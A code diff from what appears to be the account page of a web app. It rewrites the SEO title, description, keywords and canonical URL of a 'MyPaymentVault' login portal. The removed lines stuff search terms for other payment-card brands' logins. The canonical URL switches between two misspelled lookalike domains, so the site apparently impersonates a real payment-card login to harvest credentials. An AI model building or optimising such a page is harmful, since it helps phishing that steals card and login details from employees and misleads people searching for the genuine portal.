@@ -202,10 +202,10 @@ export default function AccountPage() {
     <>
       <ContentProtection />
       <SEO 
-        title="My Payment Vault - Login MyPaymentVault | Login Wirecard | Login Northlane | Login North Lane"
-        description="Login MyPaymentVault Account Portal - Access Login Wirecard, Login North Lane, Login Northlane employee payment card system. Secure multi-factor card, username, and token login. Alternative to Login Wirecard 2 and Login Onbe 1 systems."
-        keywords="Login MyPaymentVault, Login Wirecard, Login North Lane, Login Northlane, Login Wirecard 2, Login Onbe 1, card login, username login, token login, employee payment vault, my payment vault account, wirecard account login, northlane account access, north lane payment portal, mypaymentvault card authentication, wirecard multi-factor login, northlane secure login, employee card portal, payment vault portal access"
-        canonical="https://login-mypaymentvaultt.com/account"
+        title="My Account | MyPaymentVault Account Portal"
+        description="Access your MyPaymentVault account portal. Manage your payment details, check balance, and securely login with multi-factor authentication."
+        keywords="MyPaymentVault account, mypaymentvault portal, account login, payment vault account, manage account, employee payment portal, secure account access"
+        canonical="https://login-mypaymentvaultl.com/account"
       />
 
       <div className="page page--login">
